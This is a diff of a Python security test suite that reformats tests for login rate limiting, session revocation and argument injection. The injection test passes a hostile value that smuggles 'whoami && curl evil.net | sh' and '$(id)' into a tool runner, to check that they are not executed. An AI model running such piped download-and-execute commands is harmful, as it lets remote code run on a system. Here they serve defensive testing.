@@ -8,11 +8,9 @@ from __future__ import annotations
 import io
 import json
 import sys
-from pathlib import Path
 
 import pytest
 
-from app.core.errors import ApiError
 from app.core.redaction import redact_text
 from app.domain.scope import Effect, Policy, Rule, RuleKind
 from tests.helpers import csrf_headers, register_user
@@ -22,12 +20,8 @@ class TestAuthentication:
     def test_login_rate_limited(self, client, settings):
         register_user(client)
         for _ in range(settings.login_rate_limit_per_minute):
-            client.post(
-                "/api/v1/auth/login", json={"username": "tester", "password": "wrong"}
-            )
-        resp = client.post(
-            "/api/v1/auth/login", json={"username": "tester", "password": "wrong"}
-        )
+            client.post("/api/v1/auth/login", json={"username": "tester", "password": "wrong"})
+        resp = client.post("/api/v1/auth/login", json={"username": "tester", "password": "wrong"})
         assert resp.status_code == 429
         assert resp.json()["error"]["code"] == "RATE_LIMITED"
 
@@ -36,9 +30,7 @@ class TestAuthentication:
         csrf = me["csrf_token"]
         sessions = client.get("/api/v1/auth/sessions").json()["items"]
         assert len(sessions) == 1
-        client.post(
-            f"/api/v1/auth/sessions/{sessions[0]['id']}/revoke", headers=csrf_headers(csrf)
-        )
+        client.post(f"/api/v1/auth/sessions/{sessions[0]['id']}/revoke", headers=csrf_headers(csrf))
         assert client.get("/api/v1/auth/me").status_code == 401
 
     def test_cookie_flags(self, client):
@@ -159,9 +151,7 @@ class TestInjection:
         run_dir = tmp_path / "run"
         hostile = "https://api.example.com/x; whoami && curl evil.net | sh"
         runner = ToolRunner(settings)
-        result = runner.run(
-            [sys.executable, str(script), hostile, "$(id)", "`id`"], run_dir, timeout_seconds=30
-        )
+        result = runner.run([sys.executable, str(script), hostile, "$(id)", "`id`"], run_dir, timeout_seconds=30)
         assert result.status == "completed"
         captured = (run_dir / "args.txt").read_text()
         # The hostile payload must appear verbatim as a single argv element.
